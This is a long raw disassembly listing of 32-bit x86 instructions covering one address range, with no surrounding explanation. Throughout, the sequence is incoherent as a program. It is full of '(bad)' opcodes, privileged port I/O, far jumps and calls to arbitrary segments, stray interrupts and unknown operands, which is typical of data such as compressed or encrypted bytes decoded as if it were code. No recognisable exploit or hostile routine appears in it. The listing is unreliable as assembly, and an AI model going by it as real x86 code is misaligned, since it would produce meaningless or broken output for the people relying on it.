  4065b2:	inc    esi
  4065b3:	enter  0x90e8,0xf3
  4065b7:	mov    ch,0xda
  4065b9:	jmp    0x40654e
  4065bb:	sti    
  4065bc:	pop    esi
  4065bd:	sub    BYTE PTR [ebp-0x65e1d600],ah
  4065c3:	retf   
  4065c4:	dec    edx
  4065c5:	(bad)  
  4065c6:	std    
  4065c7:	ds (bad) 
  4065ca:	lahf   
  4065cb:	mov    ds:0xadf70910,al
  4065d0:	cwde   
  4065d1:	jbe    0x4065b7
  4065d3:	pop    ss
  4065d4:	test   ebp,edi
  4065d6:	(bad)  
  4065d7:	out    0xf9,eax
  4065d9:	adc    al,0x46
  4065db:	jb     0x406655
  4065dd:	imul   ebp,DWORD PTR [edx+0x775040da],0xfffffff7
  4065e4:	not    DWORD PTR [eax-0x2a855ab3]
  4065ea:	dec    esi
  4065eb:	pop    ds
  4065ec:	dec    eax
  4065ed:	mov    bh,BYTE PTR [ebx+0x7c344a35]
  4065f3:	and    DWORD PTR [edi-0x7b],0xe0ae4de3
  4065fa:	rcl    DWORD PTR [ebp+0x65092cbc],cl
  406600:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406601:	mov    dh,0x34
  406603:	daa    
  406604:	clc    
  406605:	dec    esp
  406606:	mov    ecx,0x3e371e61
  40660b:	cmp    BYTE PTR [edx],dh
  40660d:	fist   DWORD PTR [ecx+eax*2]
  406610:	mov    esp,0xe69c93b
  406615:	clc    
  406616:	adc    dh,bl
  406618:	popa   
  406619:	push   ds
  40661a:	inc    ecx
  40661b:	mov    esp,0x576c05c2
  406620:	pop    ds
  406621:	mov    ah,0xed
  406623:	cmp    DWORD PTR [eax-0x32048208],edx
  406629:	cmp    BYTE PTR [ebx],cl
  40662b:	adc    bl,bl
  40662d:	daa    
  40662e:	or     bl,bh
  406630:	(bad)  
  406631:	hlt    
  406632:	push   ebp
  406633:	dec    eax
  406634:	scas   eax,DWORD PTR es:[edi]
  406635:	xor    BYTE PTR [ecx-0x42],bh
  406638:	enter  0x3569,0x81
  40663c:	pop    ds
  40663d:	ss mov al,0xa4
  406640:	dec    edi
  406641:	fiadd  WORD PTR [edx]
  406643:	sti    
  406644:	inc    esp
  406645:	cmc    
  406646:	clc    
  406647:	stos   DWORD PTR es:[edi],eax
  406648:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406649:	fiadd  DWORD PTR [edi]
  40664b:	or     al,0xe8
  40664d:	sub    DWORD PTR [edi+eiz*4],ebx
  406650:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406651:	dec    edx
  406652:	or     BYTE PTR [ecx],ah
  406654:	das    
  406655:	mov    al,0xa4
  406657:	dec    eax
  406658:	push   edi
  406659:	lds    edi,FWORD PTR [edi+eax*8]
  40665c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40665d:	(bad)  
  40665e:	xor    eax,0x10afabed
  406663:	sbb    BYTE PTR [ebx],bh
  406665:	fucomp st(3)
  406667:	mov    bl,0x58
  406669:	(bad)  
  40666a:	daa    
  40666b:	std    
  40666c:	xchg   edx,eax
  40666d:	mov    ch,0x5e
  40666f:	fnsave ds:0xed763890
  406675:	(bad)  
  406676:	lods   al,BYTE PTR ds:[esi]
  406677:	xchg   esi,eax
  406678:	push   ecx
  406679:	(bad)  
  40667b:	into   
  40667c:	into   
  40667d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40667e:	fdivr  st(4),st
  406680:	and    edx,DWORD PTR [esi-0x25efc799]
  406686:	inc    eax
  406687:	cmp    edx,DWORD PTR [edi+edx*2]
  40668a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40668b:	idiv   ecx
  40668d:	in     eax,dx
  40668e:	dec    edx
  40668f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406690:	mov    ecx,0xbdefea3f
  406695:	ins    DWORD PTR es:[edi],dx
  406696:	stos   DWORD PTR es:[edi],eax
  406697:	and    eax,DWORD PTR [ecx+0xc]
  40669a:	push   ss
  40669b:	(bad)  
  40669c:	push   ecx
  40669d:	nop
  40669e:	scas   eax,DWORD PTR es:[edi]
  40669f:	sub    ebx,DWORD PTR ds:0x5b917195
  4066a5:	cmp    BYTE PTR es:[edi+0xedd86f1],ch
  4066ac:	xchg   DWORD PTR ss:[esi],edx
  4066af:	leave  
  4066b0:	cmp    DWORD PTR [edx+0x701a1f23],0xffffffe6
  4066b7:	test   eax,0x9bb0f213
  4066bc:	inc    ebp
  4066bd:	bound  edi,QWORD PTR [ebp-0x46]
  4066c0:	fwait
  4066c1:	xchg   edx,eax
  4066c2:	mov    cl,0x99
  4066c4:	ins    DWORD PTR es:[edi],dx
  4066c5:	popa   
  4066c6:	lock jne 0x4066dd
  4066c9:	mov    esi,0x4f745160
  4066ce:	inc    edi
  4066cf:	jbe    0x406709
  4066d1:	add    BYTE PTR [edi],dh
  4066d3:	mov    esi,0x10064c7f
  4066d8:	push   ecx
  4066d9:	(bad)  
  4066da:	sbb    dh,BYTE PTR [eax-0x1da878d1]
  4066e0:	call   0x4640:0xdcea3823
  4066e7:	ds pop ds
  4066e9:	pop    ecx
  4066ea:	jge    0x406697
  4066ec:	in     eax,dx
  4066ed:	or     BYTE PTR [edx+0xc2da9bd],cl
  4066f3:	or     esi,DWORD PTR [ebx+ebx*4-0x54]
  4066f7:	das    
  4066f8:	jl     0x4066ec
  4066fa:	das    
  4066fb:	jmp    0x406767
  4066fd:	setp   ah
  406700:	out    0x8c,al
  406702:	or     DWORD PTR ss:[edx-0x1],0x1348eb69
  40670a:	in     al,dx
  40670b:	mov    al,0x61
  40670d:	sti    
  40670e:	mov    ah,0x95
  406710:	outs   dx,BYTE PTR ds:[esi]
  406711:	dec    esi
  406712:	add    ebp,DWORD PTR ds:0x33198093
  406718:	mov    esi,0xc33f928e
  40671d:	popf   
  40671e:	cmp    esi,DWORD PTR [ebp-0x77]
  406721:	dec    esp
  406722:	pop    esi
  406723:	dec    esi
  406724:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406725:	call   0x7877:0x36f045a3
  40672c:	int    0xb1
  40672e:	xor    DWORD PTR [edi-0x66],esi
  406731:	adc    al,0xb4
  406733:	pop    esp
  406734:	rol    BYTE PTR [ecx],1
  406736:	ret    0xc531
  406739:	dec    ebx
  40673a:	outs   dx,BYTE PTR ds:[esi]
  40673b:	jns    0x4066fd
  40673d:	lods   eax,DWORD PTR ds:[esi]
  40673e:	fcom   DWORD PTR [edi-0x1514a51a]
  406744:	push   edx
  406745:	retf   
  406746:	fcomp  st(1)
  406748:	enter  0x7061,0x50
  40674c:	mov    al,0xa9
  40674e:	mov    al,ds:0xa4bcd038
  406753:	pop    es
  406754:	arpl   WORD PTR [esi],bp
  406756:	mov    ch,0xd8
  406758:	lock imul eax,DWORD PTR [ebp+esi*8-0x49d04800],0xcb0dc019
  406764:	or     BYTE PTR [esi-0x335d30a0],0xb9
  40676b:	popf   
  40676c:	ins    BYTE PTR es:[edi],dx
  40676d:	stos   DWORD PTR es:[edi],eax
  40676e:	mov    cl,0xb2
  406770:	adc    bh,cl
  406772:	cli    
  406773:	lahf   
  406774:	lods   eax,DWORD PTR ds:[esi]
  406775:	js     0x4067bd
  406777:	jecxz  0x4067cc
  406779:	pop    edx
  40677a:	dec    esp
  40677b:	cmp    DWORD PTR [ebx-0x41c92756],ecx
  406781:	add    ah,BYTE PTR [ebp-0x3b]
  406784:	daa    
  406785:	in     al,0x6c
  406787:	loope  0x4067cf
  406789:	xchg   ebx,eax
  40678a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40678b:	xor    eax,0x6880f1bf
  406790:	loope  0x406719
  406792:	cmc    
  406793:	mov    edi,0xc7fba40e
  406798:	xchg   esi,eax
  406799:	test   BYTE PTR [edx+0x104da8b2],0x8a
  4067a0:	dec    esi
  4067a1:	test   eax,0x44380f63
  4067a6:	fidivr WORD PTR ds:0xd12918d3
  4067ac:	pop    ecx
  4067ad:	lods   eax,DWORD PTR ds:[esi]
  4067ae:	add    eax,0x21376ede
  4067b3:	cmp    edi,DWORD PTR [edi]
  4067b5:	mov    ah,0x22
  4067b7:	jae    0x40678d
  4067b9:	push   ss
  4067ba:	mov    eax,ds:0x3f32868c
  4067bf:	and    dh,BYTE PTR [edx+0xbd74b97]
  4067c5:	pop    esp
  4067c6:	add    ch,cl
  4067c8:	fstp   QWORD PTR [esi+0x31]
  4067cb:	xchg   DWORD PTR [edi+0x2a21e48e],ebx
  4067d1:	mov    eax,ds:0xbc37adf6
  4067d6:	push   ebp
  4067d7:	pop    es
  4067d8:	into   
  4067d9:	loopne 0x406842
  4067db:	pop    edx
  4067dc:	push   ds
  4067dd:	push   cs
  4067de:	pop    edx
  4067df:	(bad)
  4067e2:	je     0x406831
  4067e4:	sub    DWORD PTR [ecx-0x57d7bc3],0xffffffb7
  4067eb:	mov    eax,ds:0x562701c1
  4067f0:	mov    cl,0x55
  4067f2:	fcomp  QWORD PTR [ecx+0x12]
  4067f5:	fst    st(5)
  4067f7:	je     0x406816
  4067f9:	cmp    eax,0xc6156616
  4067fe:	loope  0x406788
  406800:	ss jmp 0x4067f6
  406803:	sbb    eax,esp
  406805:	gs jo  0x40681d
  406808:	add    al,0x6
  40680a:	test   al,0xa
  40680c:	jle    0x406833
  40680e:	pop    ebp
  40680f:	sbb    ebx,0xfffffff1
  406812:	push   0xffffffbf
  406814:	loop   0x406818
  406816:	push   ecx
  406817:	ret    
  406818:	inc    ebx
  406819:	pop    eax
  40681a:	shr    BYTE PTR [edx-0x3dd8a6ce],1
  406820:	pusha  
  406821:	test   al,0x7f
  406823:	mov    dh,0x18
  406825:	call   0xb9d8847f
  40682a:	and    eax,0x38dfd63a
  40682f:	adc    BYTE PTR [eax+0x19c56757],dh
  406835:	shl    DWORD PTR [edx],cl
  406837:	and    esi,DWORD PTR [eax-0x29b7338d]
  40683d:	or     eax,0xea4a4da
  406842:	or     DWORD PTR [esi],edx
  406844:	jb     0x40684c
  406846:	(bad)  
  406848:	fisttp WORD PTR ds:0xbb9b3fe3
  40684e:	ja     0x4068ba
  406850:	mov    esp,0xc29836bd
  406855:	xor    eax,0xa4379abc
  40685a:	sbb    ah,BYTE PTR [edx-0x6ae4f9ba]
  406860:	clc    
  406861:	xchg   ecx,eax
  406862:	dec    edi
  406863:	mov    bl,BYTE PTR [eax+0x4f60f63f]
  406869:	mov    eax,ds:0x9a93446a
  40686e:	and    eax,0xa1893af8
  406873:	adc    al,0x1
  406875:	pop    DWORD PTR [ecx]
  406877:	cdq    
  406878:	call   0xcfadaa09
  40687d:	rcl    DWORD PTR [esi+0x17],1
  406880:	sub    BYTE PTR ds:0x1504a8d0,0x6
  406887:	jge    0x406818
  406889:	mov    bl,0x3b
  40688b:	idiv   al
  40688d:	js     0x406824
  40688f:	sbb    DWORD PTR [esi-0x4f],ebp
  406892:	cld    
  406893:	fcom   st(6)
  406895:	sahf   
  406896:	xor    ecx,DWORD PTR [esi-0x7]
  406899:	test   eax,0x4b6e14d8
  40689e:	sub    eax,0xecc93502
  4068a3:	lods   eax,DWORD PTR ds:[esi]
  4068a4:	mov    ch,0x24
  4068a6:	retf   
  4068a7:	mov    eax,0x8a90926a
  4068ac:	das    
  4068ad:	jp     0x4068c8
  4068af:	aad    0xec
  4068b1:	in     eax,dx
  4068b2:	adc    ebp,edx
  4068b4:	and    ebp,DWORD PTR [ebp-0x4ea1ed9f]
  4068ba:	xchg   DWORD PTR [ecx+0x1b],esi
  4068bd:	push   eax
  4068be:	mov    ebx,0x45782edb
  4068c3:	push   edx
  4068c4:	repz xchg ebp,eax
  4068c6:	add    al,0xc1
  4068c8:	xor    ebp,esi
  4068ca:	cmp    BYTE PTR [esp+edx*1+0x3a],cl
  4068ce:	repz (bad) 
  4068d0:	sahf   
  4068d1:	out    dx,eax
  4068d2:	test   DWORD PTR [edx-0x5b407b20],edi
  4068d8:	and    DWORD PTR ds:[ebx+0x5c],esp
  4068dc:	cmp    bl,bh
  4068de:	sub    ecx,ecx
  4068e0:	icebp  
  4068e1:	imul   esp,DWORD PTR [esp+edx*8],0xffffff89
  4068e5:	push   ebp
  4068e6:	sbb    DWORD PTR [edx+0x76bc01c1],0x35555965
  4068f0:	add    eax,0xbbecab80
  4068f5:	pop    ds
  4068f6:	loopne 0x4068c6
  4068f8:	div    DWORD PTR [esi-0x3a]
  4068fb:	pusha  
  4068fc:	das    
  4068fd:	and    ch,ah
  4068ff:	iret   
  406900:	xchg   edx,esi
  406902:	mov    BYTE PTR [edx-0x3178726b],ch
  406908:	add    DWORD PTR [ebx-0x5b],ecx
  40690b:	fist   DWORD PTR [ebx+0x69]
  40690e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40690f:	xor    eax,0xe52dcd46
  406914:	cmp    al,0x58
  406916:	mov    edi,0x23471461
  40691b:	mov    DWORD PTR [edx-0x4eee04c0],edx
  406921:	ins    BYTE PTR es:[edi],dx
  406922:	pop    ebp
  406923:	push   edi
  406924:	xor    bh,BYTE PTR [eax-0x7fd31daa]
  40692a:	inc    edi
  40692b:	cmp    al,0x46
  40692d:	inc    esp
  40692e:	dec    ecx
  40692f:	mov    ecx,0x7bc073c4
  406934:	jl     0x40694b
  406936:	lea    eax,[edi]
  406938:	je     0x406936
  40693a:	mov    dh,0xda
  40693c:	addr16 jne 0x4068e9
  40693f:	mov    esp,0xf892e94
  406944:	or     DWORD PTR [ecx+0x4e],esp
  406947:	jmp    0x2095:0x756c0e0
  40694e:	mov    dh,0xd0
  406950:	cmp    esi,ebx
  406952:	pop    ss
  406953:	and    eax,0x58fea2ab
  406958:	cmp    eax,0x5c7bfad6
  40695d:	ds int 0xfb
  406960:	mov    eax,ds:0xee909bac
  406965:	sub    eax,0xc99c4a3c
  40696a:	outs   dx,DWORD PTR ds:[esi]
  40696b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40696c:	out    dx,al
  40696d:	mov    eax,DWORD PTR [ecx+0x19]
  406970:	mov    edx,0x59e24fca
  406975:	out    0xe2,eax
  406977:	add    al,BYTE PTR [edx]
  406979:	or     esp,0x69042cf5
  40697f:	adc    bh,BYTE PTR [ebp+ebx*2-0x370e73f8]
  406986:	pop    edi
  406987:	mov    eax,0xf280a0c5
  40698c:	push   esp
  40698d:	push   edi
  40698e:	jo     0x406954
  406990:	jmp    0xb137:0xf4afc34f
  406997:	mov    al,ds:0xdff62cdd
  40699c:	out    0xcb,eax
  40699e:	stos   BYTE PTR es:[edi],al
  40699f:	push   0xa5fced26
  4069a4:	mov    BYTE PTR [esp+eax*1],dl
  4069a7:	js     0x4069fc
  4069a9:	lea    eax,[ecx]
  4069ab:	fs xor bl,ch
  4069ae:	div    DWORD PTR [edx]
  4069b0:	dec    esi
  4069b1:	outs   dx,DWORD PTR ds:[si]
  4069b3:	add    eax,0xf58c5f4d
  4069b8:	jno    0x406961
  4069ba:	out    0x9e,eax
  4069bc:	test   dl,dh
  4069be:	in     eax,dx
  4069bf:	xor    eax,0x203f9c34
  4069c4:	and    edi,esp
  4069c6:	mov    cl,0xe6
  4069c8:	xor    ecx,ebp
  4069ca:	(bad)  
  4069cb:	cli    
  4069cc:	fadd   QWORD PTR [ebp-0xbd7d44d]
  4069d2:	cli    
  4069d3:	or     eax,0x66e6216e
  4069d8:	dec    edx
  4069d9:	sti    
  4069da:	inc    edx
  4069db:	mov    ds:0x8fadc8ec,al
  4069e0:	imul   ecx,DWORD PTR [edi-0x452d1ec5],0x8756e1f2
  4069ea:	jmp    FWORD PTR [edi]
  4069ec:	mov    ?,WORD PTR [edx-0x33]
  4069ef:	pop    es
  4069f0:	cmp    ch,ch
  4069f2:	out    0xd3,eax
  4069f4:	jmp    0x406a6b
  4069f6:	sbb    esi,eax
  4069f8:	int3   
  4069f9:	dec    edi
  4069fa:	xor    al,0xe9
  4069fc:	aam    0x6c
  4069fe:	imul   edi,DWORD PTR [ecx-0x57e3ae57],0x39
  406a05:	scas   al,BYTE PTR es:[edi]
  406a06:	mov    edi,DWORD PTR [ebx-0x69]
  406a09:	js     0x406a85
  406a0b:	aad    0x10
  406a0d:	into   
  406a0e:	and    al,0x41
  406a10:	pop    esi
  406a11:	dec    eax
  406a12:	(bad)  
  406a13:	mov    eax,0xb6c3cab0
  406a18:	shl    DWORD PTR [ecx+0x3a8f423c],cl
  406a1e:	cmp    ch,BYTE PTR [ebp-0x27]
  406a21:	leave  
  406a22:	nop
  406a23:	push   ebp
  406a24:	cmp    DWORD PTR [ebx-0x1c],edx
  406a27:	leave  
  406a28:	mov    BYTE PTR [ecx+0x63],al
  406a2b:	(bad)  [edx-0x6a42bc2f]
  406a31:	lods   al,BYTE PTR ds:[esi]
  406a32:	jbe    0x4069bd
  406a34:	arpl   WORD PTR [ecx+0x17],bp
  406a37:	(bad)  
  406a38:	sti    
  406a39:	jg     0x406a95
  406a3b:	push   edi
  406a3c:	hlt    
  406a3d:	cmc    
  406a3e:	push   esi
  406a3f:	shr    DWORD PTR [edx+0x42],cl
  406a42:	jns    0x406a6e
  406a44:	cs push ecx
  406a46:	mov    WORD PTR [ebx-0x324320fa],fs
  406a4c:	jnp    0x406a73
  406a4e:	and    al,BYTE PTR [esi-0x6c606195]
  406a54:	outs   dx,DWORD PTR fs:[esi]
  406a56:	pop    ecx
  406a57:	lea    esp,[edx]
  406a59:	dec    ecx
  406a5a:	jmp    0x72dd9bfc
  406a5f:	sbb    DWORD PTR [ebx+eiz*4-0x43d99639],0x701758ed
  406a6a:	add    BYTE PTR [edx-0x17dd11d3],0x16
  406a71:	push   esi
  406a72:	mov    cl,0xf6
  406a74:	adc    al,BYTE PTR [eax]
  406a76:	and    al,0x78
  406a78:	xlat   BYTE PTR ds:[ebx]
  406a79:	xchg   DWORD PTR [eax-0x49ec0eb0],ebp
  406a7f:	pop    edi
  406a80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a81:	push   edi
  406a82:	dec    esp
  406a83:	push   ebp
  406a84:	adc    bl,BYTE PTR [ebx+0x11]
  406a87:	inc    eax
  406a88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a89:	js     0x406a85
  406a8b:	push   ecx
  406a8c:	cs jle 0x406ab5
  406a8f:	sub    al,0xfa
  406a91:	leave  
  406a92:	les    esi,FWORD PTR [ebx-0x2f1f3ca2]
  406a98:	push   cs
  406a99:	aaa    
  406a9a:	mov    ebp,0x2af0cdf2
  406a9f:	mov    esi,DWORD PTR [eax]
  406aa1:	sbb    al,0x1e
  406aa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406aa4:	iret   
  406aa5:	push   ecx
  406aa6:	mov    ah,0xd6
  406aa8:	pop    ebx
  406aa9:	stos   DWORD PTR es:[edi],eax
  406aaa:	mov    cl,al
  406aac:	inc    ebx
  406aad:	stc    
  406aae:	mov    eax,0xacbf5d88
  406ab3:	cmp    BYTE PTR [edi-0x10e27c16],dl
  406ab9:	xor    eax,0x868480
  406abe:	or     edx,ebx
  406ac0:	imul   eax,DWORD PTR [eax-0x72],0x75
  406ac4:	sar    DWORD PTR ss:[eax+0x3d],0xad
  406ac9:	dec    ecx
  406aca:	cli    
  406acb:	xchg   ebp,eax
  406acc:	mov    ecx,0xaa4529fd
  406ad1:	inc    esi
  406ad2:	lods   eax,DWORD PTR ds:[esi]
  406ad3:	mov    ah,ah
  406ad5:	mov    dh,0xff
  406ad7:	pop    ebx
  406ad8:	jg     0x406a86
  406ada:	clc    
  406adb:	(bad)  
  406adc:	es inc eax
  406ade:	adc    ah,ah
  406ae0:	dec    edi
  406ae1:	sbb    DWORD PTR [edi+0x38],eax
  406ae4:	outs   dx,BYTE PTR ds:[esi]
  406ae5:	jge    0x406b09
  406ae7:	imul   esi,DWORD PTR [edi-0x3fd9fa89],0xf07266ce
  406af1:	lods   eax,DWORD PTR ds:[esi]
  406af2:	das    
  406af3:	mov    al,ds:0xa3051512
  406af8:	shr    DWORD PTR [ebp+0x5f],0x39
  406afc:	stos   BYTE PTR es:[edi],al
  406afd:	in     al,dx
  406afe:	scas   al,BYTE PTR es:[edi]
  406aff:	inc    dh
  406b01:	push   ds
  406b02:	sbb    edi,DWORD PTR [ebx+0x784c5130]
  406b08:	xchg   ecx,eax
  406b09:	pop    ecx
  406b0a:	stos   BYTE PTR es:[edi],al
  406b0b:	dec    esp
  406b0c:	lock mov edx,0x9a60281e
  406b12:	xchg   ebx,eax
  406b13:	or     eax,0x2ac6ad9b
  406b18:	js     0x406b73
  406b1a:	inc    ecx
  406b1b:	fstp   TBYTE PTR [edi]
  406b1d:	test   BYTE PTR [eax+0x74d6d8b0],dh
  406b23:	clc    
  406b24:	fiadd  DWORD PTR [ecx]
  406b26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b27:	dec    edi
  406b28:	fiadd  DWORD PTR [edx+0x48]
  406b2b:	sub    DWORD PTR [eax-0x7c],ebx
  406b2e:	imul   DWORD PTR [edx+ecx*4+0x7e]
  406b32:	imul   DWORD PTR [eax-0x63e0fb72]
  406b38:	mov    esi,0xdf6f988e
  406b3d:	sbb    BYTE PTR [ebx],dl
  406b3f:	fmul   st(4),st
  406b41:	mov    bh,0x22
  406b43:	push   esp
  406b44:	je     0x406b00
  406b46:	push   esp
  406b47:	cmp    eax,0xec179055
  406b4c:	cmp    cl,BYTE PTR [esi]
  406b4e:	rol    BYTE PTR [esi-0x55],0x1e
  406b52:	dec    ebp
  406b53:	xchg   esi,eax
  406b54:	add    ecx,DWORD PTR [eax+0x16]
  406b57:	push   cs
  406b58:	(bad)  
  406b59:	or     BYTE PTR [edx+0x1c6028d9],bl
  406b5f:	hlt    
  406b60:	(bad)  
  406b61:	add    BYTE PTR [esi-0x2fa1e73e],ah
  406b67:	in     eax,dx
  406b68:	mov    esi,0x3505c4fa
  406b6d:	in     al,0xea
  406b6f:	cld    
  406b70:	pop    edi
  406b71:	dec    esi
  406b72:	fsubp  st(4),st
  406b74:	lock enter 0xad30,0xb1
  406b79:	inc    esp
  406b7a:	mov    al,0x26
  406b7c:	xchg   edx,eax
  406b7d:	pop    ebx
  406b7e:	or     bh,BYTE PTR [ebx+esi*2-0x53]
  406b82:	and    bh,ch
  406b84:	mov    dh,BYTE PTR ds:0xd84b00c1
  406b8a:	mov    ebx,0xf147a0d2
  406b8f:	add    eax,0xf0577b73
  406b94:	push   0xa8895db3
  406b99:	add    al,0x9c
  406b9b:	or     DWORD PTR [eax],eax
  406b9d:	iret   
  406b9e:	lods   eax,DWORD PTR ds:[esi]
  406b9f:	add    BYTE PTR [edx-0x3e1762a3],bl
  406ba5:	shl    eax,0x3e
  406ba8:	neg    DWORD PTR [edx-0x74928cd0]
  406bae:	jp     0x406b52
  406bb0:	pop    ss
  406bb1:	mov    ds:0x13cae3e9,al
  406bb6:	loopne 0x406bf8
  406bb8:	pushf  
  406bb9:	or     ah,bh
  406bbb:	mov    ebp,0x4276775e
  406bc0:	cmp    al,0x2e
  406bc2:	mov    bh,0x7c
  406bc4:	xchg   bl,cl
  406bc6:	cmp    ebp,DWORD PTR [esi]
  406bc8:	jns    0x406c19
  406bca:	add    BYTE PTR [ebp-0x3b44efb1],cl
  406bd0:	outs   dx,DWORD PTR ds:[esi]
  406bd1:	pop    ecx
  406bd2:	dec    eax
  406bd3:	fcom   DWORD PTR [ecx]
  406bd5:	dec    edi
  406bd6:	neg    DWORD PTR [ebp+0x25]
  406bd9:	push   ecx
  406bda:	fmul   QWORD PTR [edx-0x76ac8bac]
  406be0:	sbb    ecx,ecx
  406be2:	test   eax,0x5dd250c0
  406be7:	push   edx
  406be8:	shl    esp,0xdb
  406beb:	fwait
  406bec:	push   cs
  406bed:	(bad)  
  406bee:	cmp    ah,cl
  406bf0:	rcr    DWORD PTR [esp+eiz*2-0x1f],1
  406bf4:	jecxz  0x406c4a
  406bf6:	aaa    
  406bf7:	cmp    DWORD PTR [eax-0x4f140b6c],edi
  406bfd:	sub    esp,eax
  406bff:	cmp    DWORD PTR [esi],esi
  406c01:	cli    
  406c02:	or     dl,BYTE PTR [edi-0x23f83432]
  406c08:	jns    0x406c84
  406c0a:	rol    DWORD PTR [ebx],cl
  406c0c:	dec    esi
  406c0d:	xchg   ebx,eax
  406c0e:	xor    DWORD PTR [edx+ecx*8],ebx
  406c11:	mov    bl,0x2
  406c13:	shr    BYTE PTR [esp+edi*8],cl
  406c16:	loope  0x406c82
  406c18:	lods   eax,DWORD PTR ds:[esi]
  406c19:	mov    esi,0x3cceff75
  406c1e:	xchg   ebp,eax
  406c1f:	mov    DWORD PTR [ebx+0x47f15ca4],edx
  406c25:	push   ss
  406c26:	fbstp  TBYTE PTR [edi+0x581c4896]
  406c2c:	fldenv ds:0x10004858
  406c32:	les    esp,FWORD PTR [ecx+0x6da60975]
  406c38:	les    esp,FWORD PTR [edx+0x72edb54b]
  406c3e:	pusha  
  406c3f:	or     BYTE PTR [esi],ch
  406c41:	test   DWORD PTR [esi],0xe2b494ff
  406c47:	ss add al,0x79
  406c4a:	aaa    
  406c4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c4c:	jmp    0xe3309a58
  406c51:	push   ecx
  406c52:	sti    
  406c53:	pop    edi
  406c54:	xlat   BYTE PTR ds:[ebx]
  406c55:	dec    ebp
  406c56:	retf   
  406c57:	pop    edx
  406c58:	push   eax
  406c59:	cli    
  406c5a:	das    
  406c5b:	xchg   ebp,eax
  406c5c:	adc    al,0x82
  406c5e:	fstp   DWORD PTR [eax+edx*2+0x1635af14]
  406c65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c66:	mov    ebp,0xd6ff2b3b
  406c6b:	pop    ebp
  406c6c:	push   eax
  406c6d:	adc    eax,0xbba8de16
  406c72:	mov    eax,ds:0xa4060115
  406c77:	outs   dx,BYTE PTR ds:[esi]
  406c78:	jle    0x406c84
  406c7a:	mov    ds:0x8f953fe,al
  406c7f:	mov    bl,0x45
  406c81:	rcl    DWORD PTR [eax+0x183717bb],cl
  406c87:	push   0x30
  406c89:	dec    eax
  406c8a:	mov    al,0x1a
  406c8c:	call   0x51bb:0x6f65
  406c92:	int    0x4
  406c94:	cmp    al,0x53
  406c97:	xchg   ebx,eax
  406c98:	adc    DWORD PTR [edx],eax
  406c9a:	xchg   ebp,eax
  406c9b:	das    
  406c9c:	inc    ebx
  406c9d:	pop    ss
  406c9e:	mov    bh,0xd4
  406ca0:	iret   
  406ca1:	and    BYTE PTR ds:0x645a3985,ah
  406ca7:	lock rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406caa:	fcomi  st,st(5)
  406cac:	(bad)  
  406cad:	add    DWORD PTR [ecx-0x57],eax
  406cb0:	mov    ebx,0x1d68f553
  406cb5:	pusha  
  406cb6:	cmp    DWORD PTR [esi],edi
  406cb8:	inc    ebx
  406cb9:	mov    al,ds:0x7b31b052
  406cbe:	add    dh,BYTE PTR [edi-0x5cc32138]
  406cc4:	mov    WORD PTR [ecx-0xccba3d5],ds
  406cca:	cmp    cl,BYTE PTR [ecx-0x3f500ecf]
  406cd0:	shl    dl,1
  406cd2:	inc    edx
  406cd3:	jecxz  0x406d12
  406cd5:	das    
  406cd6:	or     edi,DWORD PTR [ecx]
  406cd8:	jg     0x406cae
  406cda:	aam    0x6
  406cdc:	mov    WORD PTR [ebx-0x6b60fad0],ds
  406ce2:	fild   WORD PTR [ebp-0x62]
  406ce5:	arpl   WORD PTR [ecx],bx
  406ce7:	lods   al,BYTE PTR ds:[esi]
  406ce8:	pop    ebx
  406ce9:	ins    DWORD PTR es:[edi],dx
  406cea:	pushf  
  406ceb:	sti    
  406cec:	push   ecx
  406ced:	or     ch,dl
  406cef:	je     0x406c82
  406cf1:	push   edx
  406cf2:	(bad)  
  406cf3:	push   esi
  406cf4:	mov    eax,ds:0xb90ed28
  406cf9:	push   es
  406cfa:	xor    BYTE PTR [ebp-0x7a035352],dh
  406d00:	push   ss
  406d01:	sbb    edi,ebx
  406d03:	mov    edi,0xbf5a2f15
  406d08:	xchg   ebp,eax
  406d09:	pop    ss
  406d0a:	dec    edi
  406d0b:	mov    ecx,0xf7f35071
  406d10:	imul   BYTE PTR [ecx-0x544b4c07]
  406d16:	dec    esp
  406d17:	dec    ebp
  406d18:	add    BYTE PTR [ebx],dh
  406d1a:	push   0xf
  406d1c:	adc    al,BYTE PTR ds:0x836747d0
  406d22:	push   esp
  406d23:	bound  esp,QWORD PTR [edx+edi*2+0x75fa2de4]
  406d2a:	mov    ebp,0x2e38ef59
  406d2f:	and    BYTE PTR [edx+ebp*2-0xa],dl
  406d33:	mov    dh,0x5a
  406d35:	xchg   DWORD PTR [esp+edi*2],esp
  406d38:	jmp    0x2f36:0x61201e75
  406d3f:	icebp  
  406d40:	mov    DWORD PTR [edx-0x6],ebx
  406d43:	jae    0x406cf7
  406d45:	sbb    edx,edi
  406d47:	mov    bh,0x8a
  406d49:	dec    edi
  406d4a:	push   ebx
  406d4b:	xor    esp,eax
  406d4d:	ins    DWORD PTR es:[edi],dx
  406d4e:	shl    ah,cl
  406d50:	mov    ?,WORD PTR [ebx+ebp*1]
  406d53:	jg     0x406d89
  406d55:	or     BYTE PTR [ecx],ah
  406d57:	and    ebx,ebx
  406d59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d5b:	sub    al,0x7f
  406d5d:	pop    ds
  406d5e:	pop    esi
  406d5f:	push   eax
  406d60:	(bad)  
  406d61:	or     al,0xd4
  406d63:	dec    ebp
  406d64:	dec    esi
  406d65:	and    bh,cl
  406d67:	gs fwait
